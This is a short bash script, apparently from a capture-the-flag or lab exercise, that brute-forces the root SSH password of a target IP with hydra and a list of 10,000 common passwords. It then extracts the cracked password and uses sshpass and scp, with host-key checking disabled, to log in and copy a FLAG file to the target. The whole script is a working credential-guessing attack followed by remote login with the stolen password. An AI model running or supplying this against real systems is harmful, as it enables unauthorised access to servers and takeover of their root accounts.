#!/bin/bash

LOG_HYDRA_FNAME='log_hydra.txt'
# LOG_HYDRA_FNAME='example_log_hydra.txt'
# LOG_HYDRA_FNAME='example_log_hydra_with_err.txt'

TARGET_IP=$1

hydra -l root -P 10000_common_passwords -s 22 -f $TARGET_IP ssh &> $LOG_HYDRA_FNAME


if ! grep -q ERROR "$LOG_HYDRA_FNAME"; then
    SSH_PASSWORD=$(cat $LOG_HYDRA_FNAME | grep -oP 'password: \K.*')
    echo "$SSH_PASSWORD" > FLAG
    sshpass -p "$SSH_PASSWORD" scp -o StrictHostKeyChecking=no FLAG root@$TARGET_IP:/FLAG
fi
